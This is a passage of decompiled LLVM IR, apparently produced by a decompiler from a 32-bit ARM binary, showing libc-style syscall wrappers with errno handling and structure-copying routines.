  %v0_f398 = load i32, i32* %r2.global-to-local, align 4
  %v1_f398 = sub i32 0, %v0_f398
  store i32 %v1_f398, i32* %r2.global-to-local, align 4
  %v3_f39c = add i32 %v4_f394, %v0_f390
  %v4_f39c = inttoptr i32 %v3_f39c to i32*
  store i32 %v1_f398, i32* %v4_f39c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f3a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f3a4

dec_label_pc_f3a4:                                ; preds = %dec_label_pc_f370, %dec_label_pc_f38c
  %v1_f3a8 = phi i32 [ %v0_f37c, %dec_label_pc_f370 ], [ -1, %dec_label_pc_f38c ]
  %v2_f3a4 = phi i32 [ %v3_f370, %dec_label_pc_f370 ], [ %v2_f3a4.pre, %dec_label_pc_f38c ]
  store i32 %v2_f3a4, i32* @r7, align 4
  ret i32 %v1_f3a8

; uselistorder directives
  uselistorder i32 %v0_f37c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f3a4, { 1, 0 }
}

define i32 @function_f3b0() local_unnamed_addr {
dec_label_pc_f3b0:
  %v1_f3c0 = load i32, i32* @r0, align 4
  ret i32 %v1_f3c0
}

define i32 @function_f3c4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_f3c4:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f3c4 = load i32, i32* @r7, align 4
  store i32 %v3_f3c4, i32* %stack_var_-8, align 4
  %v0_f3d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f3d0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f3d0, -4095
  br i1 %tmp, label %dec_label_pc_f3f8, label %dec_label_pc_f3e0

dec_label_pc_f3e0:                                ; preds = %dec_label_pc_f3c4
  %v0_f3e4 = call i32 @function_f150()
  %v3_f3e8 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_f3e8 = sext i16 %v3_f3e8 to i32
  %v0_f3ec = load i32, i32* %r2.global-to-local, align 4
  %v1_f3ec = sub i32 0, %v0_f3ec
  store i32 %v1_f3ec, i32* %r2.global-to-local, align 4
  %v3_f3f0 = add i32 %v4_f3e8, %v0_f3e4
  %v4_f3f0 = inttoptr i32 %v3_f3f0 to i32*
  store i32 %v1_f3ec, i32* %v4_f3f0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_f3f8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f3f8

dec_label_pc_f3f8:                                ; preds = %dec_label_pc_f3c4, %dec_label_pc_f3e0
  %v1_f3fc = phi i32 [ %v0_f3d0, %dec_label_pc_f3c4 ], [ -1, %dec_label_pc_f3e0 ]
  %v2_f3f8 = phi i32 [ %v3_f3c4, %dec_label_pc_f3c4 ], [ %v2_f3f8.pre, %dec_label_pc_f3e0 ]
  store i32 %v2_f3f8, i32* @r7, align 4
  ret i32 %v1_f3fc

; uselistorder directives
  uselistorder i32 %v0_f3d0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f3f8, { 1, 0 }
}

define i32 @function_f404() local_unnamed_addr {
dec_label_pc_f404:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f404 = load i32, i32* @r7, align 4
  store i32 %v3_f404, i32* %stack_var_-8, align 4
  %v0_f410 = load i32, i32* @r0, align 4
  store i32 %v0_f410, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f410, -4095
  br i1 %tmp, label %dec_label_pc_f438, label %dec_label_pc_f420

dec_label_pc_f420:                                ; preds = %dec_label_pc_f404
  %v0_f424 = call i32 @function_f150()
  %v3_f428 = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_f428 = sext i16 %v3_f428 to i32
  %v0_f42c = load i32, i32* %r2.global-to-local, align 4
  %v1_f42c = sub i32 0, %v0_f42c
  store i32 %v1_f42c, i32* %r2.global-to-local, align 4
  %v3_f430 = add i32 %v4_f428, %v0_f424
  %v4_f430 = inttoptr i32 %v3_f430 to i32*
  store i32 %v1_f42c, i32* %v4_f430, align 4
  %v2_f438.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f438

dec_label_pc_f438:                                ; preds = %dec_label_pc_f404, %dec_label_pc_f420
  %v1_f43c = phi i32 [ %v0_f410, %dec_label_pc_f404 ], [ -1, %dec_label_pc_f420 ]
  %v2_f438 = phi i32 [ %v3_f404, %dec_label_pc_f404 ], [ %v2_f438.pre, %dec_label_pc_f420 ]
  store i32 %v2_f438, i32* @r7, align 4
  ret i32 %v1_f43c

; uselistorder directives
  uselistorder i32 %v0_f410, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f438, { 1, 0 }
}

define i32 @function_f444(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f444:
  store i32 %arg1, i32* @r0, align 4
  %v4_f450 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 12468) to i32*), align 4
  %v2_f454 = icmp eq i32 %v4_f450, 0
  %v3_f458 = load i32, i32* @r4, align 4
  %v9_f458 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_f454, label %dec_label_pc_f468, label %dec_label_pc_f444.dec_label_pc_f470_crit_edge

dec_label_pc_f444.dec_label_pc_f470_crit_edge:    ; preds = %dec_label_pc_f444
  br label %dec_label_pc_f470

dec_label_pc_f468:                                ; preds = %dec_label_pc_f444
  store i32 %v3_f458, i32* @r4, align 4
  store i32 %v9_f458, i32* @r6, align 4
  %v0_f46c = call i32 @function_f404()
  br label %dec_label_pc_f470

dec_label_pc_f470:                                ; preds = %dec_label_pc_f444.dec_label_pc_f470_crit_edge, %dec_label_pc_f468
  %v0_f470 = call i32 @function_e9c8()
  %v0_f474 = load i32, i32* @r6, align 4
  store i32 %v0_f474, i32* @r1, align 4
  store i32 %v0_f470, i32* @r5, align 4
  %v0_f47c = load i32, i32* @r4, align 4
  store i32 %v0_f47c, i32* @r0, align 4
  %v0_f480 = call i32 @function_f404()
  store i32 %v0_f480, i32* @r4, align 4
  %v0_f488 = load i32, i32* @r5, align 4
  %v1_f48c = call i32 @function_e940(i32 %v0_f488)
  %v0_f490 = load i32, i32* @r4, align 4
  ret i32 %v0_f490

; uselistorder directives
  uselistorder label %dec_label_pc_f470, { 1, 0 }
}

define i32 @function_f4a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_f4a4:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f4a4 = load i32, i32* @r4, align 4
  store i32 %v3_f4a4, i32* %stack_var_-16, align 4
  store i32 11556, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r4.global-to-local, align 4
  %v4_f4b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 11556) to i32*), align 4
  %v2_f4b8 = icmp eq i32 %v4_f4b4, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_f4b8, label %dec_label_pc_f4c4, label %dec_label_pc_f4d4

dec_label_pc_f4c4:                                ; preds = %dec_label_pc_f4a4
  %v1_f4c8 = call i32 @function_1200c(i32 0)
  %v1_f4cc = icmp slt i32 %v1_f4c8, 0
  br i1 %v1_f4cc, label %dec_label_pc_f4f8, label %dec_label_pc_f4d4thread-pre-split

dec_label_pc_f4d4thread-pre-split:                ; preds = %dec_label_pc_f4c4
  %v0_f4d8.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_f4d4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_f4d4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f4d4

dec_label_pc_f4d4:                                ; preds = %dec_label_pc_f4d4thread-pre-split, %dec_label_pc_f4a4
  %v1_f4d4 = phi i32 [ %v1_f4d4.pre, %dec_label_pc_f4d4thread-pre-split ], [ 11556, %dec_label_pc_f4a4 ]
  %v0_f4d4 = phi i32 [ %v0_f4d4.pre, %dec_label_pc_f4d4thread-pre-split ], [ ptrtoint (i32* @global_var_1d280.213 to i32), %dec_label_pc_f4a4 ]
  %v1_f4e8 = phi i32 [ %v0_f4d8.pr, %dec_label_pc_f4d4thread-pre-split ], [ %arg1, %dec_label_pc_f4a4 ]
  %v2_f4d4 = add i32 %v0_f4d4, %v1_f4d4
  %v3_f4d4 = inttoptr i32 %v2_f4d4 to i32*
  %v4_f4d4 = load i32, i32* %v3_f4d4, align 4
  %v2_f4d8 = icmp eq i32 %v1_f4e8, 0
  store i32 %v4_f4d4, i32* %r4.global-to-local, align 4
  br i1 %v2_f4d8, label %dec_label_pc_f4fc, label %dec_label_pc_f4e4

dec_label_pc_f4e4:                                ; preds = %dec_label_pc_f4d4
  %v2_f4e8 = add i32 %v4_f4d4, %v1_f4e8
  %v1_f4ec = call i32 @function_1200c(i32 %v2_f4e8)
  %v1_f4f0 = icmp slt i32 %v1_f4ec, 0
  br i1 %v1_f4f0, label %dec_label_pc_f4f8, label %dec_label_pc_f4e4.dec_label_pc_f4fc_crit_edge

dec_label_pc_f4e4.dec_label_pc_f4fc_crit_edge:    ; preds = %dec_label_pc_f4e4
  %v0_f4fc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f4fc

dec_label_pc_f4f8:                                ; preds = %dec_label_pc_f4e4, %dec_label_pc_f4c4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f4fc

dec_label_pc_f4fc:                                ; preds = %dec_label_pc_f4d4, %dec_label_pc_f4e4.dec_label_pc_f4fc_crit_edge, %dec_label_pc_f4f8
  %v0_f4fc = phi i32 [ %v0_f4fc.pre, %dec_label_pc_f4e4.dec_label_pc_f4fc_crit_edge ], [ -1, %dec_label_pc_f4f8 ], [ %v4_f4d4, %dec_label_pc_f4d4 ]
  %v2_f500 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f500, i32* @r4, align 4
  ret i32 %v0_f4fc

; uselistorder directives
  uselistorder i32 %v4_f4d4, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_1200c, { 1, 0 }
  uselistorder label %dec_label_pc_f4fc, { 2, 1, 0 }
}

define i32 @function_f510(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f510:
  %v2_f514 = icmp eq i32* %arg2, null
  br i1 %v2_f514, label %dec_label_pc_f558, label %dec_label_pc_f528

dec_label_pc_f528:                                ; preds = %dec_label_pc_f510
  %v2_f528 = load i32, i32* %arg2, align 4
  %v1_f52c = icmp slt i32 %v2_f528, 0
  br i1 %v1_f52c, label %dec_label_pc_f540, label %dec_label_pc_f534

dec_label_pc_f534:                                ; preds = %dec_label_pc_f528
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_f534 = load i32, i32* %.pre3, align 4
  %v1_f538 = urem i32 %v3_f534, 2
  %v2_f538 = icmp eq i32 %v1_f538, 0
  br i1 %v2_f538, label %dec_label_pc_f558, label %dec_label_pc_f540

dec_label_pc_f540:                                ; preds = %dec_label_pc_f528, %dec_label_pc_f534
  %v2_f540 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_f540 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_f558

dec_label_pc_f558:                                ; preds = %dec_label_pc_f534, %dec_label_pc_f510, %dec_label_pc_f540
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_f58c, label %dec_label_pc_f574

dec_label_pc_f574:                                ; preds = %dec_label_pc_f558
  %v1_f578 = sub i32 0, %arg1
  %v3_f57c = load i16, i16* @global_var_1d2d8.209, align 2
  %v4_f57c = sext i16 %v3_f57c to i32
  %v0_f580 = call i32 @function_f150()
  %v3_f584 = add i32 %v4_f57c, %v0_f580
  %v4_f584 = inttoptr i32 %v3_f584 to i32*
  store i32 %v1_f578, i32* %v4_f584, align 4
  br label %dec_label_pc_f58c

dec_label_pc_f58c:                                ; preds = %dec_label_pc_f558, %dec_label_pc_f574
  %v1_f594 = phi i32 [ %arg1, %dec_label_pc_f558 ], [ -1, %dec_label_pc_f574 ]
  ret i32 %v1_f594

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f58c, { 1, 0 }
  uselistorder label %dec_label_pc_f558, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f540, { 1, 0 }
}

define i32 @function_f59c(i32 %arg1) local_unnamed_addr {
dec_label_pc_f59c:
  %v1_f5ac = load i32, i32* @r0, align 4
  ret i32 %v1_f5ac
}

define i32 @function_f5b0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f5b0:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_f5b0 = load i32, i32* @r4, align 4
  store i32 %v3_f5b0, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_f5c8 = inttoptr i32 %arg2 to i8*
  %v4_f5c8 = call i32 @function_bff0(i8* %v3_f5c8, i32 0, i32 104)
  %v2_f5cc = load i32, i32* %arg1, align 4
  store i32 %v2_f5cc, i32* %r3.global-to-local, align 4
  %v3_f5cc = add i32 %tmp, 4
  %v4_f5cc = inttoptr i32 %v3_f5cc to i32*
  %v5_f5cc = load i32, i32* %v4_f5cc, align 4
  store i32 %v5_f5cc, i32* %r4.global-to-local, align 4
  %v0_f5d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_f5d0 = inttoptr i32 %v0_f5d0 to i32*
  store i32 %v2_f5cc, i32* %v1_f5d0, align 4
  %v3_f5d0 = add i32 %v0_f5d0, 4
  %v4_f5d0 = inttoptr i32 %v3_f5d0 to i32*
  %v5_f5d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_f5d0, i32* %v4_f5d0, align 4
  %v0_f5d4 = load i32, i32* %r6.global-to-local, align 4
  %v1_f5d4 = add i32 %v0_f5d4, 12
  %v2_f5d4 = inttoptr i32 %v1_f5d4 to i32*
  %v3_f5d4 = load i32, i32* %v2_f5d4, align 4
  %v1_f5d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_f5d8 = add i32 %v1_f5d8, 12
  %v3_f5d8 = inttoptr i32 %v2_f5d8 to i32*
  store i32 %v3_f5d4, i32* %v3_f5d8, align 4
  %v0_f5dc = load i32, i32* %r6.global-to-local, align 4
  %v1_f5dc = add i32 %v0_f5dc, 96
  store i32 %v1_f5dc, i32* %r3.global-to-local, align 4
  %v1_f5e0 = inttoptr i32 %v1_f5dc to i32*
  %v2_f5e0 = load i32, i32* %v1_f5e0, align 4
  store i32 %v2_f5e0, i32* %r3.global-to-local, align 4
  %v3_f5e0 = add i32 %v0_f5dc, 100
  %v4_f5e0 = inttoptr i32 %v3_f5e0 to i32*
  %v5_f5e0 = load i32, i32* %v4_f5e0, align 4
  store i32 %v5_f5e0, i32* %r4.global-to-local, align 4
  %v1_f5e4 = add i32 %v0_f5dc, 56
  %v2_f5e4 = inttoptr i32 %v1_f5e4 to i32*
  %v3_f5e4 = load i32, i32* %v2_f5e4, align 4
  store i32 %v3_f5e4, i32* %r2.global-to-local, align 4
  %v1_f5e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_f5e8 = add i32 %v1_f5e8, 96
  %v3_f5e8 = inttoptr i32 %v2_f5e8 to i32*
  store i32 %v2_f5e0, i32* %v3_f5e8, align 4
  %v0_f5ec = load i32, i32* %r4.global-to-local, align 4
  %v1_f5ec = load i32, i32* %r5.global-to-local, align 4
  %v2_f5ec = add i32 %v1_f5ec, 100
  %v3_f5ec = inttoptr i32 %v2_f5ec to i32*
  store i32 %v0_f5ec, i32* %v3_f5ec, align 4
  %v0_f5f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_f5f0 = add i32 %v0_f5f0, 24
  store i32 %v1_f5f0, i32* %ip.global-to-local, align 4
  %v1_f5f4 = inttoptr i32 %v1_f5f0 to i32*
  %v2_f5f4 = load i32, i32* %v1_f5f4, align 4
  store i32 %v2_f5f4, i32* %ip.global-to-local, align 4
  %v3_f5f4 = add i32 %v0_f5f0, 28
  %v4_f5f4 = inttoptr i32 %v3_f5f4 to i32*
  %v5_f5f4 = load i32, i32* %v4_f5f4, align 4
  store i32 %v5_f5f4, i32* %lr.global-to-local, align 4
  %v0_f5f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_f5f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_f5f8 = add i32 %v1_f5f8, 56
  %v3_f5f8 = inttoptr i32 %v2_f5f8 to i32*
  store i32 %v0_f5f8, i32* %v3_f5f8, align 4
  %v0_f5fc = load i32, i32* %r6.global-to-local, align 4
  %v1_f5fc = add i32 %v0_f5fc, 72
  store i32 %v1_f5fc, i32* %r3.global-to-local, align 4
  %v1_f600 = add i32 %v0_f5fc, 32
  store i32 %v1_f600, i32* %r7.global-to-local, align 4
  %v1_f604 = inttoptr i32 %v1_f600 to i32*
  %v2_f604 = load i32, i32* %v1_f604, align 4
  store i32 %v2_f604, i32* %r7.global-to-local, align 4
  %v3_f604 = add i32 %v0_f5fc, 36
  %v4_f604 = inttoptr i32 %v3_f604 to i32*
  %v5_f604 = load i32, i32* %v4_f604, align 4
  store i32 %v5_f604, i32* %r8.global-to-local, align 4
  %v1_f608 = inttoptr i32 %v1_f5fc to i32*
  %v2_f608 = load i32, i32* %v1_f608, align 4
  %v3_f608 = add i32 %v0_f5fc, 76
  %v4_f608 = inttoptr i32 %v3_f608 to i32*
  %v5_f608 = load i32, i32* %v4_f608, align 4
  store i32 %v5_f608, i32* %r1.global-to-local, align 4
  %v0_f60c = load i32, i32* %r5.global-to-local, align 4
  %v1_f60c = add i32 %v0_f60c, 72
  %v1_f610 = inttoptr i32 %v1_f60c to i32*
  store i32 %v2_f608, i32* %v1_f610, align 4
  %v3_f610 = add i32 %v0_f60c, 76
  %v4_f610 = inttoptr i32 %v3_f610 to i32*
  %v5_f610 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_f610, i32* %v4_f610, align 4
  %v0_f614 = load i32, i32* %r7.global-to-local, align 4
  %v1_f614 = load i32, i32* %r5.global-to-local, align 4
  %v2_f614 = add i32 %v1_f614, 32
  %v3_f614 = inttoptr i32 %v2_f614 to i32*
  store i32 %v0_f614, i32* %v3_f614, align 4
  %v0_f618 = load i32, i32* %r8.global-to-local, align 4
  %v1_f618 = load i32, i32* %r5.global-to-local, align 4
  %v2_f618 = add i32 %v1_f618, 36
  %v3_f618 = inttoptr i32 %v2_f618 to i32*
  store i32 %v0_f618, i32* %v3_f618, align 4
  %v0_f61c = load i32, i32* %r6.global-to-local, align 4
  %v1_f61c = add i32 %v0_f61c, 80
  store i32 %v1_f61c, i32* %r3.global-to-local, align 4
  %v1_f620 = add i32 %v0_f61c, 48
  store i32 %v1_f620, i32* %r7.global-to-local, align 4
  %v1_f624 = inttoptr i32 %v1_f620 to i32*
  %v2_f624 = load i32, i32* %v1_f624, align 4
  store i32 %v2_f624, i32* %r7.global-to-local, align 4
  %v3_f624 = add i32 %v0_f61c, 52
  %v4_f624 = inttoptr i32 %v3_f624 to i32*
  %v5_f624 = load i32, i32* %v4_f624, align 4
  store i32 %v5_f624, i32* %r8.global-to-local, align 4
  %v1_f628 = inttoptr i32 %v1_f61c to i32*
  %v2_f628 = load i32, i32* %v1_f628, align 4
  %v3_f628 = add i32 %v0_f61c, 84
  %v4_f628 = inttoptr i32 %v3_f628 to i32*
  %v5_f628 = load i32, i32* %v4_f628, align 4
  store i32 %v5_f628, i32* %r1.global-to-local, align 4
  %v1_f62c = add i32 %v0_f61c, 16
  %v2_f62c = inttoptr i32 %v1_f62c to i32*
  %v3_f62c = load i32, i32* %v2_f62c, align 4
  store i32 %v3_f62c, i32* %r2.global-to-local, align 4
  %v0_f630 = load i32, i32* %r5.global-to-local, align 4
  %v1_f630 = add i32 %v0_f630, 80
  %v1_f634 = inttoptr i32 %v1_f630 to i32*
  store i32 %v2_f628, i32* %v1_f634, align 4
  %v3_f634 = add i32 %v0_f630, 84
  %v4_f634 = inttoptr i32 %v3_f634 to i32*
  %v5_f634 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_f634, i32* %v4_f634, align 4
  %v0_f638 = load i32, i32* %r7.global-to-local, align 4
  %v1_f638 = load i32, i32* %r5.global-to-local, align 4
  %v2_f638 = add i32 %v1_f638, 48
  %v3_f638 = inttoptr i32 %v2_f638 to i32*
  store i32 %v0_f638, i32* %v3_f638, align 4
  %v0_f63c = load i32, i32* %r8.global-to-local, align 4
  %v1_f63c = load i32, i32* %r5.global-to-local, align 4
  %v2_f63c = add i32 %v1_f63c, 52
  %v3_f63c = inttoptr i32 %v2_f63c to i32*
  store i32 %v0_f63c, i32* %v3_f63c, align 4
  %v0_f640 = load i32, i32* %r2.global-to-local, align 4
  %v1_f640 = load i32, i32* %r5.global-to-local, align 4
  %v2_f640 = add i32 %v1_f640, 16
  %v3_f640 = inttoptr i32 %v2_f640 to i32*
  store i32 %v0_f640, i32* %v3_f640, align 4
  %v0_f644 = load i32, i32* %r6.global-to-local, align 4
  %v1_f644 = add i32 %v0_f644, 88
  store i32 %v1_f644, i32* %r3.global-to-local, align 4
  %v1_f648 = add i32 %v0_f644, 20
  %v2_f648 = inttoptr i32 %v1_f648 to i32*
  %v3_f648 = load i32, i32* %v2_f648, align 4
  store i32 %v3_f648, i32* %r2.global-to-local, align 4
  %v1_f64c = inttoptr i32 %v1_f644 to i32*
  %v2_f64c = load i32, i32* %v1_f64c, align 4
  %v3_f64c = add i32 %v0_f644, 92
  %v4_f64c = inttoptr i32 %v3_f64c to i32*
  %v5_f64c = load i32, i32* %v4_f64c, align 4
  store i32 %v5_f64c, i32* %r1.global-to-local, align 4
  %v1_f650 = add i32 %v0_f644, 64
  store i32 %v1_f650, i32* %r6.global-to-local, align 4
  %v1_f654 = inttoptr i32 %v1_f650 to i32*
  %v2_f654 = load i32, i32* %v1_f654, align 4
  store i32 %v2_f654, i32* %r6.global-to-local, align 4
  %v3_f654 = add i32 %v0_f644, 68
  %v4_f654 = inttoptr i32 %v3_f654 to i32*
  %v5_f654 = load i32, i32* %v4_f654, align 4
  store i32 %v5_f654, i32* %r7.global-to-local, align 4
  %v0_f658 = load i32, i32* %r5.global-to-local, align 4
  %v1_f658 = add i32 %v0_f658, 88
  store i32 %v1_f658, i32* %r3.global-to-local, align 4
  %v2_f65c = add i32 %v0_f658, 20
  %v3_f65c = inttoptr i32 %v2_f65c to i32*
  store i32 %v3_f648, i32* %v3_f65c, align 4
  %v0_f660 = load i32, i32* %ip.global-to-local, align 4
  %v1_f660 = load i32, i32* %r5.global-to-local, align 4
  %v2_f660 = add i32 %v1_f660, 24
  %v3_f660 = inttoptr i32 %v2_f660 to i32*
  store i32 %v0_f660, i32* %v3_f660, align 4
  %v0_f664 = load i32, i32* %lr.global-to-local, align 4
  %v1_f664 = load i32, i32* %r5.global-to-local, align 4
  %v2_f664 = add i32 %v1_f664, 28
  %v3_f664 = inttoptr i32 %v2_f664 to i32*
  store i32 %v0_f664, i32* %v3_f664, align 4
  %v0_f668 = load i32, i32* %r6.global-to-local, align 4
  %v1_f668 = load i32, i32* %r5.global-to-local, align 4
  %v2_f668 = add i32 %v1_f668, 64
  %v3_f668 = inttoptr i32 %v2_f668 to i32*
  store i32 %v0_f668, i32* %v3_f668, align 4
  %v0_f66c = load i32, i32* %r7.global-to-local, align 4
  %v1_f66c = load i32, i32* %r5.global-to-local, align 4
  %v2_f66c = add i32 %v1_f66c, 68
  %v3_f66c = inttoptr i32 %v2_f66c to i32*
  store i32 %v0_f66c, i32* %v3_f66c, align 4
  %v0_f670 = load i32, i32* %r3.global-to-local, align 4
  %v1_f670 = inttoptr i32 %v0_f670 to i32*
  store i32 %v2_f64c, i32* %v1_f670, align 4
  %v3_f670 = add i32 %v0_f670, 4
  %v4_f670 = inttoptr i32 %v3_f670 to i32*
  %v5_f670 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_f670, i32* %v4_f670, align 4
  %v2_f674 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_f674, i32* %r4.global-to-local, align 4
  ret i32 %v2_f64c

; uselistorder directives
  uselistorder i32 %v0_f644, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_f61c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 2, 1, 0, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_f67c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f67c:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_f67c = load i32, i32* @r4, align 4
  store i32 %v3_f67c, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_f694 = inttoptr i32 %arg2 to i8*
  %v4_f694 = call i32 @function_bff0(i8* %v3_f694, i32 0, i32 88)
  %v2_f698 = load i32, i32* %arg1, align 4
  %v3_f698 = add i32 %tmp, 4
  %v4_f698 = inttoptr i32 %v3_f698 to i32*
  %v5_f698 = load i32, i32* %v4_f698, align 4
  store i32 %v5_f698, i32* %r4.global-to-local, align 4
  %v0_f69c = load i32, i32* %r6.global-to-local, align 4
  %v1_f69c = inttoptr i32 %v0_f69c to i32*
  store i32 %v2_f698, i32* %v1_f69c, align 4
  %v3_f69c = add i32 %v0_f69c, 4
  %v4_f69c = inttoptr i32 %v3_f69c to i32*
  %v5_f69c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_f69c, i32* %v4_f69c, align 4
  %v0_f6a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_f6a0 = add i32 %v0_f6a0, 32
  %v1_f6a4 = inttoptr i32 %v1_f6a0 to i32*
  %v2_f6a4 = load i32, i32* %v1_f6a4, align 4
  %v3_f6a4 = add i32 %v0_f6a0, 36
  %v4_f6a4 = inttoptr i32 %v3_f6a4 to i32*
  %v5_f6a4 = load i32, i32* %v4_f6a4, align 4
  store i32 %v5_f6a4, i32* %r4.global-to-local, align 4
  %v1_f6a8 = add i32 %v0_f6a0, 96
  %v2_f6a8 = inttoptr i32 %v1_f6a8 to i32*
  %v3_f6a8 = load i32, i32* %v2_f6a8, align 4
  store i32 %v3_f6a8, i32* %r2.global-to-local, align 4
  %v1_f6ac = load i32, i32* %r6.global-to-local, align 4
  %v2_f6ac = add i32 %v1_f6ac, 32
  %v3_f6ac = inttoptr i32 %v2_f6ac to i32*
  store i32 %v2_f6a4, i32* %v3_f6ac, align 4
  %v0_f6b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_f6b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_f6b0 = add i32 %v1_f6b0, 36
  %v3_f6b0 = inttoptr i32 %v2_f6b0 to i32*
  store i32 %v0_f6b0, i32* %v3_f6b0, align 4
  %v0_f6b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_f6b4 = load i32, i32* %r6.global-to-local, align 4
  %v2_f6b4 = add i32 %v1_f6b4, 12
  %v3_f6b4 = inttoptr i32 %v2_f6b4 to i32*
  store i32 %v0_f6b4, i32* %v3_f6b4, align 4
  %v0_f6b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_f6b8 = add i32 %v0_f6b8, 48
  %v2_f6b8 = inttoptr i32 %v1_f6b8 to i32*
  %v3_f6b8 = load i32, i32* %v2_f6b8, align 4
  %v1_f6bc = add i32 %v0_f6b8, 24
  store i32 %v1_f6bc, i32* %ip.global-to-local, align 4
  %v1_f6c0 = inttoptr i32 %v1_f6bc to i32*
  %v2_f6c0 = load i32, i32* %v1_f6c0, align 4
